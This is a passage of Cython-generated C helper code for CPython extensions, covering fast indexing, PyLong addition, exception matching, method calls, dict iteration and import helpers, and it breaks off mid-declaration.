static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}


#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif


static CYTHON_INLINE void __Pyx_RaiseClosureNameError(const char *varname) {
    PyErr_Format(PyExc_NameError, "free variable '%s' referenced before assignment in enclosing scope", varname);
}


#if !CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyBytes_Join(PyObject* sep, PyObject* values) {
    return PyObject_CallMethodObjArgs(sep, __pyx_n_s_join, values, NULL);
}
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif


static int __Pyx_TryUnpackUnboundCMethod(__Pyx_CachedCFunction* target) {
    PyObject *method;
    method = __Pyx_PyObject_GetAttrStr(target->type, *target->method_name);
    if (unlikely(!method))
        return -1;
    target->method = method;
#if CYTHON_COMPILING_IN_CPYTHON
    #if PY_MAJOR_VERSION >= 3
    if (likely(__Pyx_TypeCheck(method, &PyMethodDescr_Type)))
    #endif
    {
        PyMethodDescrObject *descr = (PyMethodDescrObject*) method;
        target->func = descr->d_method->ml_meth;
        target->flag = descr->d_method->ml_flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_STACKLESS);
    }
#endif
    return 0;
}


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg) {
    if (likely(cfunc->func)) {
        int flag = cfunc->flag;
        if (flag == METH_O) {
            return (*(cfunc->func))(self, arg);
        } else if (PY_VERSION_HEX >= 0x030600B1 && flag == METH_FASTCALL) {
            #if PY_VERSION_HEX >= 0x030700A0
                return (*(__Pyx_PyCFunctionFast)(void*)(PyCFunction)cfunc->func)(self, &arg, 1);
            #else
                return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, &arg, 1, NULL);
            #endif
        } else if (PY_VERSION_HEX >= 0x030700A0 && flag == (METH_FASTCALL | METH_KEYWORDS)) {
            return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, &arg, 1, NULL);
        }
    }
    return __Pyx__CallUnboundCMethod1(cfunc, self, arg);
}
#endif
static PyObject* __Pyx__CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg){
    PyObject *args, *result = NULL;
    if (unlikely(!cfunc->func && !cfunc->method) && unlikely(__Pyx_TryUnpackUnboundCMethod(cfunc) < 0)) return NULL;
#if CYTHON_COMPILING_IN_CPYTHON
    if (cfunc->func && (cfunc->flag & METH_VARARGS)) {
        args = PyTuple_New(1);
        if (unlikely(!args)) goto bad;
        Py_INCREF(arg);
        PyTuple_SET_ITEM(args, 0, arg);
        if (cfunc->flag & METH_KEYWORDS)
            result = (*(PyCFunctionWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, NULL);
        else
            result = (*cfunc->func)(self, args);
    } else {
        args = PyTuple_New(2);
        if (unlikely(!args)) goto bad;
        Py_INCREF(self);
        PyTuple_SET_ITEM(args, 0, self);
        Py_INCREF(arg);
        PyTuple_SET_ITEM(args, 1, arg);
        result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
    }
#else
    args = PyTuple_Pack(2, self, arg);
    if (unlikely(!args)) goto bad;
    result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
#endif
bad:
    Py_XDECREF(args);
    return result;
}


#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030600B1
static CYTHON_INLINE PyObject *__Pyx_CallUnboundCMethod2(__Pyx_CachedCFunction *cfunc, PyObject *self, PyObject *arg1, PyObject *arg2) {
    if (likely(cfunc->func)) {
        PyObject *args[2] = {arg1, arg2};
        if (cfunc->flag == METH_FASTCALL) {
            #if PY_VERSION_HEX >= 0x030700A0
            return (*(__Pyx_PyCFunctionFast)(void*)(PyCFunction)cfunc->func)(self, args, 2);
            #else
            return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, 2, NULL);
            #endif
        }
        #if PY_VERSION_HEX >= 0x030700A0
        if (cfunc->flag == (METH_FASTCALL | METH_KEYWORDS))
            return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, 2, NULL);
        #endif
    }
    return __Pyx__CallUnboundCMethod2(cfunc, self, arg1, arg2);
}
#endif
static PyObject* __Pyx__CallUnboundCMethod2(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg1, PyObject* arg2){
    PyObject *args, *result = NULL;
    if (unlikely(!cfunc->func && !cfunc->method) && unlikely(__Pyx_TryUnpackUnboundCMethod(cfunc) < 0)) return NULL;
#if CYTHON_COMPILING_IN_CPYTHON
    if (cfunc->func && (cfunc->flag & METH_VARARGS)) {
        args = PyTuple_New(2);
        if (unlikely(!args)) goto bad;
        Py_INCREF(arg1);
        PyTuple_SET_ITEM(args, 0, arg1);
        Py_INCREF(arg2);
        PyTuple_SET_ITEM(args, 1, arg2);
        if (cfunc->flag & METH_KEYWORDS)
            result = (*(PyCFunctionWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, NULL);
        else
            result = (*cfunc->func)(self, args);
    } else {
        args = PyTuple_New(3);
        if (unlikely(!args)) goto bad;
        Py_INCREF(self);
        PyTuple_SET_ITEM(args, 0, self);
        Py_INCREF(arg1);
        PyTuple_SET_ITEM(args, 1, arg1);
        Py_INCREF(arg2);
        PyTuple_SET_ITEM(args, 2, arg2);
        result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
    }
#else
    args = PyTuple_Pack(3, self, arg1, arg2);
    if (unlikely(!args)) goto bad;
    result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
#endif
bad:
    Py_XDECREF(args);
    return result;
}


static PyObject* __Pyx_PyDict_GetItemDefault(PyObject* d, PyObject* key, PyObject* default_value) {
    PyObject* value;
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (unlikely(PyErr_Occurred()))
            return NULL;
        value = default_value;
    }
    Py_INCREF(value);
    if ((1));
#else
    if (PyString_CheckExact(key) || PyUnicode_CheckExact(key) || PyInt_CheckExact(key)) {
        value = PyDict_GetItem(d, key);
        if (unlikely(!value)) {
            value = default_value;
        }
        Py_INCREF(value);
    }
#endif
    else {
        if (default_value == Py_None)
            value = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_get, d, key);
        else
            value = __Pyx_CallUnboundCMethod2(&__pyx_umethod_PyDict_Type_get, d, key, default_value);
    }
    return value;
}


static CYTHON_INLINE int __Pyx_IterFinish(void) {
#if CYTHON_FAST_THREAD_STATE
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject* exc_type = tstate->curexc_type;
    if (unlikely(exc_type)) {
        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) {
            PyObject *exc_value, *exc_tb;
            exc_value = tstate->curexc_value;
            exc_tb = tstate->curexc_traceback;
            tstate->curexc_type = 0;
            tstate->curexc_value = 0;
            tstate->curexc_traceback = 0;
            Py_DECREF(exc_type);
            Py_XDECREF(exc_value);
            Py_XDECREF(exc_tb);
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#else
    if (unlikely(PyErr_Occurred())) {
        if (likely(PyErr_ExceptionMatches(PyExc_StopIteration))) {
            PyErr_Clear();
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#endif
}


static PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name) {
    PyObject *method = NULL, *result = NULL;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_CallOneArg(method, obj);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) goto bad;
    result = __Pyx_PyObject_CallNoArg(method);
    Py_DECREF(method);
bad:
    return result;
}


static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}


static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}


static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    }
    return __Pyx_IterFinish();
}


static CYTHON_INLINE void __Pyx_RaiseNoneNotIterableError(void) {
    PyErr_SetString(PyExc_TypeError, "'NoneType' object is not iterable");
}


static void __Pyx_UnpackTupleError(PyObject *t, Py_ssize_t index) {
    if (t == Py_None) {
      __Pyx_RaiseNoneNotIterableError();
    } else if (PyTuple_GET_SIZE(t) < index) {
      __Pyx_RaiseNeedMoreValuesError(PyTuple_GET_SIZE(t));
    } else {
      __Pyx_RaiseTooManyValuesError(index);
    }
}


static CYTHON_INLINE int __Pyx_unpack_tuple2_exact(
        PyObject* tuple, PyObject** pvalue1, PyObject** pvalue2, int decref_tuple) {
    PyObject *value1 = NULL, *value2 = NULL;
#if CYTHON_COMPILING_IN_PYPY
    value1 = PySequence_ITEM(tuple, 0);  if (unlikely(!value1)) goto bad;
    value2 = PySequence_ITEM(tuple, 1);  if (unlikely(!value2)) goto bad;
#else
    value1 = PyTuple_GET_ITEM(tuple, 0);  Py_INCREF(value1);
    value2 = PyTuple_GET_ITEM(tuple, 1);  Py_INCREF(value2);
#endif
    if (decref_tuple) {
        Py_DECREF(tuple);
    }
    *pvalue1 = value1;
    *pvalue2 = value2;
    return 0;
#if CYTHON_COMPILING_IN_PYPY
bad:
    Py_XDECREF(value1);
    Py_XDECREF(value2);
    if (decref_tuple) { Py_XDECREF(tuple); }
    return -1;
#endif
}
static int __Pyx_unpack_tuple2_generic(PyObject* tuple, PyObject** pvalue1, PyObject** pvalue2,
                                       int has_known_size, int decref_tuple) {
    Py_ssize_t index;
    PyObject *value1 = NULL, *value2 = NULL, *iter = NULL;
    iternextfunc iternext;
    iter = PyObject_GetIter(tuple);
    if (unlikely(!iter)) goto bad;
    if (decref_tuple) { Py_DECREF(tuple); tuple = NULL; }
    iternext = Py_TYPE(iter)->tp_iternext;
    value1 = iternext(iter); if (unlikely(!value1)) { index = 0; goto unpacking_failed; }
    value2 = iternext(iter); if (unlikely(!value2)) { index = 1; goto unpacking_failed; }
    if (!has_known_size && unlikely(__Pyx_IternextUnpackEndCheck(iternext(iter), 2))) goto bad;
    Py_DECREF(iter);
    *pvalue1 = value1;
    *pvalue2 = value2;
    return 0;
unpacking_failed:
    if (!has_known_size && __Pyx_IterFinish() == 0)
        __Pyx_RaiseNeedMoreValuesError(index);
bad:
    Py_XDECREF(iter);
    Py_XDECREF(value1);
    Py_XDECREF(value2);
    if (decref_tuple) { Py_XDECREF(tuple); }
    return -1;
}


static CYTHON_INLINE PyObject* __Pyx_dict_iterator(PyObject* iterable, int is_dict, PyObject* method_name,
                                                   Py_ssize_t* p_orig_length, int* p_source_is_dict) {
    is_dict = is_dict || likely(PyDict_CheckExact(iterable));
    *p_source_is_dict = is_dict;
    if (is_dict) {
#if !CYTHON_COMPILING_IN_PYPY
        *p_orig_length = PyDict_Size(iterable);
        Py_INCREF(iterable);
        return iterable;
#elif PY_MAJOR_VERSION >= 3
        static PyObject *py_items = NULL, *py_keys = NULL, *py_values = NULL;
        PyObject **pp = NULL;
        if (method_name) {
            const char *name = PyUnicode_AsUTF8(method_name);
            if (strcmp(name, "iteritems") == 0) pp = &py_items;
            else if (strcmp(name, "iterkeys") == 0) pp = &py_keys;
            else if (strcmp(name, "itervalues") == 0) pp = &py_values;
            if (pp) {
                if (!*pp) {
                    *pp = PyUnicode_FromString(name + 4);
                    if (!*pp)
                        return NULL;
                }
                method_name = *pp;
            }
        }
#endif
    }
    *p_orig_length = 0;
    if (method_name) {
        PyObject* iter;
        iterable = __Pyx_PyObject_CallMethod0(iterable, method_name);
        if (!iterable)
            return NULL;
#if !CYTHON_COMPILING_IN_PYPY
        if (PyTuple_CheckExact(iterable) || PyList_CheckExact(iterable))
            return iterable;
#endif
        iter = PyObject_GetIter(iterable);
        Py_DECREF(iterable);
        return iter;
    }
    return PyObject_GetIter(iterable);
}
static CYTHON_INLINE int __Pyx_dict_iter_next(
        PyObject* iter_obj, CYTHON_NCP_UNUSED Py_ssize_t orig_length, CYTHON_NCP_UNUSED Py_ssize_t* ppos,
        PyObject** pkey, PyObject** pvalue, PyObject** pitem, int source_is_dict) {
    PyObject* next_item;
#if !CYTHON_COMPILING_IN_PYPY
    if (source_is_dict) {
        PyObject *key, *value;
        if (unlikely(orig_length != PyDict_Size(iter_obj))) {
            PyErr_SetString(PyExc_RuntimeError, "dictionary changed size during iteration");
            return -1;
        }
        if (unlikely(!PyDict_Next(iter_obj, ppos, &key, &value))) {
            return 0;
        }
        if (pitem) {
            PyObject* tuple = PyTuple_New(2);
            if (unlikely(!tuple)) {
                return -1;
            }
            Py_INCREF(key);
            Py_INCREF(value);
            PyTuple_SET_ITEM(tuple, 0, key);
            PyTuple_SET_ITEM(tuple, 1, value);
            *pitem = tuple;
        } else {
            if (pkey) {
                Py_INCREF(key);
                *pkey = key;
            }
            if (pvalue) {
                Py_INCREF(value);
                *pvalue = value;
            }
        }
        return 1;
    } else if (PyTuple_CheckExact(iter_obj)) {
        Py_ssize_t pos = *ppos;
        if (unlikely(pos >= PyTuple_GET_SIZE(iter_obj))) return 0;
        *ppos = pos + 1;
        next_item = PyTuple_GET_ITEM(iter_obj, pos);
        Py_INCREF(next_item);
    } else if (PyList_CheckExact(iter_obj)) {
        Py_ssize_t pos = *ppos;
        if (unlikely(pos >= PyList_GET_SIZE(iter_obj))) return 0;
        *ppos = pos + 1;
        next_item = PyList_GET_ITEM(iter_obj, pos);
        Py_INCREF(next_item);
    } else
#endif
    {
        next_item = PyIter_Next(iter_obj);
        if (unlikely(!next_item)) {
            return __Pyx_IterFinish();
        }
    }
    if (pitem) {
        *pitem = next_item;
    } else if (pkey && pvalue) {
        if (__Pyx_unpack_tuple2(next_item, pkey, pvalue, source_is_dict, source_is_dict, 1))
            return -1;
    } else if (pkey) {
        *pkey = next_item;
    } else {
        *pvalue = next_item;
    }
    return 1;
}


#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, attr_name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(attr_name));
#endif
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif


static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}


static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}


static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}


#include <structmember.h>
static PyObject *
